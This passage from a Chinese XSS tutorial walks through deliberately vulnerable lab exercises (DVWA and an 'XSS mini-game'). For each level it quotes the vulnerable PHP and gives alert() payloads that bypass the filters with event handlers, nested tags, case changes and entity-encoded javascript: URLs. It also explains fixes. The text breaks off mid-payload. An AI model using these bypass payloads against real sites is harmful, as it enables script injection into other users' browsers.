$a= &apos;&lt;?php echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&apos;;&lt;/script&gt; 和上一题类似，只是这里的最后是通过htmlentities() 函数把字符转换为 HTML 实体，然后再输出单引号修饰的a变量中。htmlentities()会将双引号&quot; 特殊编码，但是却它不编码单引号&#39;，恰巧这里是通过单引号&#39;给a变量赋值的，所以依然可以通过闭合单引号&#39;来弹窗。 payload 12example7.php?name=&apos;;alert(&apos;XSS&apos;);&apos;example7.php?name=&apos;;alert(&apos;XSS&apos;);// 第8关 PHP_SELF源码 12345678910&lt;?php require_once &apos;../header.php&apos;; if (isset($_POST[&quot;name&quot;])) &#123; echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]); &#125;?&gt;&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt; name变量通过form表单以POST方式传入，然后通过htmlentities函数是实体化后输出来，这次通过POST方式传入的name变量是比较安全的，暂时无法突破。重点分析这里&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot;，用户依然可以控制参数PHP_SELF ，并且这里没有过滤直接输入到了form标签中，所以这里通过闭合依然可以XSS。 闭合引号和标签，通过&lt;script&gt;标签来弹窗： payload1 1example8.php/&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;// 也可以通过闭合引号，通过事件来触发弹窗： payload2 1example8.php/&quot; onclick=alert(&apos;XSS&apos;)// 第9关 location.hash源码 123&lt;script&gt; document.write(location.hash.substring(1));&lt;/script&gt; 直接通过location.hash传入参数，然后往网页中写入，这样很不安全，可以直接通过这个属性，往网页中写入JS代码。要了解这个location.hash属性，可以参考W3C的这篇资料：HTML DOM hash 属性 payload 1example9.php#&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 执行完成后，手动刷新下浏览器，经测试在Chrome和FireFox浏览器上的尖括号会被自动转码，在IE内核的浏览器上可以正常运行 DVWA习题讲解反射 XSS LOW源码 1234567891011&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user $html .= '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 可以看看到对name变量没有任何的过滤措施，只是单纯的检测了name变量存在并且不为空就直接输出到了网页中。 payload 1&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 反射 XSS Medium源码 1234567891011121314&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user $html .= "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 只是简单的过滤了&lt;script&gt;标签，可以使用其他的标签绕过，这里因为正则匹配的规则问题，检测到敏感字符就将替换为空（即删除），也可以使用嵌套构造和大小写转换来绕过。 使用其他的标签，通过事件来弹窗，这里有很多就不一一列举了： payload1 1&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt; 因为过滤规则的缺陷，这里可以使用嵌套构造来绕过： payload2 1&lt;s&lt;script&gt;cript&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过的： payload3 1&lt;Script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 反射 XSS high源码 1234567891011121314&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user $html .= "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 这里的正则过滤更加完善了些，不区分大小写，并且使用了通配符去匹配，导致嵌套构造的方法也不能成功，但是还有其他很多标签来达到弹窗的效果： payload 1&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt; 反射 XSS Impossible源码 123456789101112131415161718&lt;?php// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user $html .= "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; name变量通过htmlspecialchars()函数被HTML实体化后输出在了&lt;pre&gt;标签中，目前来说没有什么的姿势可以绕过，如果这个输出在一些标签内的话，还是可以尝试绕过的。 $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );这个实体化函数可以修复上面三个级别 DOM XSS LOW源码 12345678910111213141516171819202122&lt;div class="vulnerable_code_area"&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;form name="XSS" method="GET"&gt; &lt;select name="default"&gt; &lt;script&gt; if (document.location.href.indexOf("default=") &gt;= 0) &#123; var lang = document.location.href.substring(document.location.href.indexOf("default=")+8); document.write("&lt;option value='" + lang + "'&gt;" + $decodeURI(lang) + "&lt;/option&gt;"); document.write("&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"); &#125; document.write("&lt;option value='English'&gt;English&lt;/option&gt;"); document.write("&lt;option value='French'&gt;French&lt;/option&gt;"); document.write("&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;"); document.write("&lt;option value='German'&gt;German&lt;/option&gt;"); &lt;/script&gt; &lt;/select&gt; &lt;input type="submit" value="Select" /&gt; &lt;/form&gt;&lt;/div&gt; DOM XSS是通过修改页面的DOM节点形成的XSS。首先通过选择语言后然后往页面中创建了新的DOM节点： 12document.write("&lt;option value='" + lang + "'&gt;" + $decodeURI(lang) + "&lt;/option&gt;");document.write("&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"); 这里的lang变量通过document.location.href来获取到，并且没有任何过滤就直接URL解码后输出在了&lt;option&gt;标签中，以下payload在Firefox Developer Edition 56.0b9版本的浏览器测试成功 payload 1?default=English &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; DOM XSS Medium源码 1234567891011121314&lt;?php// Is there any input?if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) &#123; $default = $_GET['default']; # Do not allow script tags if (stripos ($default, "&lt;script") !== false) &#123; header ("location: ?default=English"); exit; &#125;&#125;?&gt; 对default变量进行了过滤，通过stripos() 函数查找&lt;script字符串在default变量值中第一次出现的位置（不区分大小写），如果匹配搭配的话手动通过location将URL后面的参数修正为?default=English，同样这里可以通过其他的标签搭配事件来达到弹窗的效果。 闭合&lt;option&gt;和&lt;select&gt;，然后使用&lt;img&gt;标签通过事件来弹窗 payload1 1?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt; 子节点&lt;/option&gt;和父节点&lt;/select&gt;都要闭合直接利用&lt;input&gt;的事件来弹窗 payload2 1?default=English&lt;input onclick=alert(&apos;XSS&apos;) /&gt; DOM XSS high源码 1234567891011121314151617181920&lt;?php// Is there any input?if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) &#123; # White list the allowable languages switch ($_GET['default']) &#123; case "French": case "English": case "German": case "Spanish": # ok break; default: header ("location: ?default=English"); exit; &#125;&#125;?&gt; 使用了白名单模式，如果default的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为: ?default=English ，这里只是对default的变量进行了过滤。 可以使用&amp;连接另一个自定义变量来Bypass payload1 12?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;?default=English&amp;a=&lt;input onclick=alert(&apos;XSS&apos;) /&gt; 也可以使用#来Bypass payload2 12?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;?default=English#&lt;input onclick=alert(&apos;XSS&apos;) /&gt; DOM XSS Impossible源码 12345# For the impossible level, don't decode the querystring$decodeURI = "decodeURI";if ($vulnerabilityFile == 'impossible.php') &#123; $decodeURI = "";&#125; Impossible级别直接不对我们的输入参数进行URL解码了，这样会导致标签失效，从而无法XSS 存储 XSS LOW源码 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitize name input $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; trim语法 1trim(string,charlist) 细节 移除string字符两侧的预定义字符。 参数 描述 string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符 charlist如果被省略，则移除以下所有字符： 符号 解释 \0 NULL \t 制表符 \n 换行 \x0B 垂直制表符 \r 回车 空格 stripslashes语法 1stripslashes(string) 细节 去除掉string字符的反斜杠\，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。 mysql_real_escape_string语法 1mysql_real_escape_string(string,connection) 细节 转义 SQL 语句中使用的字符串中的特殊字符。 参数 描述 string 必需。规定要转义的字符串。 connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 下列字符受影响： \x00 \n \r \ ‘ “ \x1a 以上这些函数都只是对数据库进行了防护，却没有考虑到对XSS进行过滤，所以依然可以正常的来XSS payload 12Name: sqlsecMessage: &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 可以看到我们的payload直接插入到了数据库中了： 测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这条记录。 存储 XSS Medium源码 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '&lt;script&gt;', '', $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; addslashes语法 1addslashes(string) 细节 返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\） NULL strip_tags语法 1strip_tags(string,allow) 细节 剥去字符串中的 HTML、XML 以及 PHP 的标签。 参数 描述 string 必需。规定要检查的字符串。 allow 可选。规定允许的标签。这些标签不会被删除。 htmlspecialchars语法 1htmlspecialchars(string,flags,character-set,double_encode) 细节 把预定义的字符转换为 HTML 实体。 预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 &quot; ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; > （大于）成为 &gt; message 变量几乎把所有的XSS都给过滤了，但是name变量只是过滤了&lt;script&gt;标签而已，我们依然可以在name参数尝试使用其他的标签配合事件来触发弹窗。 name的input输入文本框限制了长度： 1&lt;input name="txtName" size="30" maxlength="10" type="text"&gt; 审查元素手动将maxlength的值调大一点就可以了。 1&lt;input name="txtName" size="50" maxlength="50" type="text"&gt; payload1 12Name: &lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;Message: www.sqlsec.com 可以看到我们的payload直接插入到了数据库中了： 因为name过滤规则的缺陷，同样使用嵌套构造和大小写转换也是可以Bypass的： paylaod2 12345Name: &lt;Script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;Message: www.sqlsec.comName: &lt;s&lt;script&gt;cript&gt;alert(&apos;XSS&apos;)&lt;/script&gt;Message: www.sqlsec.com 测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这些记录。 存储 XSS high源码 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; message变量依然是没有什么希望，重点分析下name变量，发现仅仅使用了如下规则来过滤，所以依然可以使用其他的标签来Bypass 1$name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); payload 12Name: &lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;Message: www.sqlsec.com 存储 XSS Impossible源码 12345678910111213141516171819202122232425262728293031&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; message和name变量都进行了严格的过滤，而且还检测了用户的token： 1checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 有效地防止了CSRF的攻击 XSS小游戏习题讲解第1关 无任何过滤措施源码 12345&lt;?phpini_set("display_errors", 0);$str = $_GET["name"];echo "&lt;h2 align=center&gt;欢迎用户:".$str."&lt;/h2&gt;";?&gt; name变量通过GET方式传入，直接带入到&lt;h2&gt;标签中，没有任何过滤。 payload 1/level1.php?name=&lt;script&gt;alert('xss')&lt;/script&gt; 第2关 闭合双引号源码 12345678910&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str.&apos;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; keyword变量通过GET方式传入，赋值给$str变量，然后带入到&lt;h2&gt;标签中和&lt;input&gt;标签。 &lt;h2&gt;标签经过了htmlspecialchars($str)编码，&lt;input&gt;标签没有任何过滤，所以尝试在&lt;input&gt;标签中闭合双引号&quot;，来触发事件。 payload 1&quot; onclick=alert(&apos;XSS&apos;) // 第3关 闭合单引号源码 12345678910&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; keyword变量通过GET方式传入，赋值给$str变量，然后带入到&lt;h2&gt;标签中和&lt;input&gt;标签。 &lt;h2&gt;标签经过了htmlspecialchars($str)编码，&lt;input&gt;标签没有任何过滤，所以尝试在&lt;input&gt;标签中闭合单引号&#39;，来触发事件。 payload 1&apos; onclick=alert(&apos;XSS&apos;) // 第4关 闭合双引号源码 123456789101112&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 在第2关的基础上，过滤了尖括号，但是直接在&lt;input&gt;标签中构造闭合双引号来构造事件来触发并用不到引号，所以第2关的payload依然适用。 payload 1&quot; onclick=alert(&apos;XSS&apos;) // 第5关 javascript妙用源码 123456789101112&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 首先对keyword变量使用了strtolower()函数转换，把所有字符转换为小写；接着过滤了&lt;script，并替换为&lt;scr_ipt；过滤了on并替换为o_n。因为on是很多事件都包含的关键词，所以这里无法直接通过闭合引号在&lt;input&gt;标签中来触发弹窗了，这个可以闭合双引号和标签，然后通过javascript:alert(&#39;XSS&#39;)这种形式来触发弹窗。 payload 1&quot;&gt;&lt;a href=javascript:alert(&apos;XSS&apos;) // 第6关 大小写转换源码 123456789101112131415&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 比第5关加入了很多的过滤规则，而且过滤了href属性，这样就无法使用javascript:alert()这种形势来弹窗了，但是仔细观察源码，这里少了第5关的strtolower()函数，所以这里可以通过大小写转换来绕过过滤。 payload1 1&quot; Onclick=alert(&apos;XSS&apos;) // payload2 1&quot;&gt;&lt;a Href=javascript:alert(&apos;XSS&apos;) // 第7关 嵌套构造源码 123456789101112131415&lt;?phpini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 在第6关的基础上，首先还统一使用了strtolower()函数，将keyword变量的值转换了小写，这样就无法直接使用大小写转换的思路来绕过了。但是这里的过滤比较巧妙，是直接将敏感字符替换为空（即删掉了），这种机制我们可以尝试使用嵌套构造payload来绕过。 payload 1&quot; oonnclick=alert(&apos;XSS&apos;) // 第8关 HTML编码源码 12345678910111213141516171819&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?php echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;?&gt; 这里的过滤规则很完善，基本上都过滤掉了可能触发弹窗的一些字符串。同时有2个输出，一个输出在了&lt;input&gt;标签中，并且通过htmlspecialchars($str)函数实体化后输出来，这里基本上是凉凉了。看第2个输出，是在&lt;a&gt;标签中，而且没有过滤，直接输出在了双引号&quot;之间，当作字符串处理，利用当作字符串处理的特点，可以直接将我们的payload HTML使用HTML实体字符编码绕过，有因为直接输出在了href的属性里面，所以可以尝试javascript()这种形式来触发弹窗。 j将t编码为t payload1 1javascrip&amp;#x74;:alert(&apos;XSS&apos;) // 也可以将Tab键编码为插入到关键词中绕过过滤；同理也可以将`回车键`编码为插入来Bypass payload2 12javascrip&amp;#x09;t:alert(&apos;XSS&apos;) //javascrip&amp;#x0a;t:alert(&apos;XSS&apos;) // 第9关 阅读源码源码 1234567891011121314151617181920212223242526&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?phpif(false===strpos($str7,&apos;http://&apos;))&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; &#125;else&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;&#125;?&gt; 这里只是比第8关多了到对提交的keyword里面是否有http://的检测，所以Bypass的话就很简单，直接在第8关的payload后面添加：http:// payload 1javascrip&amp;#x74;:alert(&apos;XSS&apos;) //http:// 第10关 覆盖元素属性源码 1234567891011121314&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 可以看出这里keyword变量依然没戏，被HTML实体化输出了出来，所以重点放在t_sort变量上，只过滤了尖括号，然后就直接输出到了&lt;input&gt;标签中，所以这里可以尝试直接在标签中闭合构造事件来弹窗，还得注意一点就是这里的&lt;input&gt;标签使用了type=&quot;hidden&quot;将输入框隐藏了起来，可以手动赋值type的值来覆盖掉先前的属性来达到显示文本框的目的。 payload 1level10.php?keyword=233&amp;t_sort=&quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) // 第11关 HTTP Referer源码 12345678910111213141516&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_REFERER&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 看变量的输出基本上可以判定$str和$str00变量没戏，也就是我们可以控制的keyword和t_sort变量是无法突破限制来弹窗的。观察$str33是通过$str11=$_SERVER[&#39;HTTP_REFERER&#39;];过滤了尖括号然后赋值的，那么尝试在HTTP请求头的Referer构造payload。 使用hackbar或者BurpSuite可以很方便地改写HTTP请求头地Referer字段： payload 1Referer: 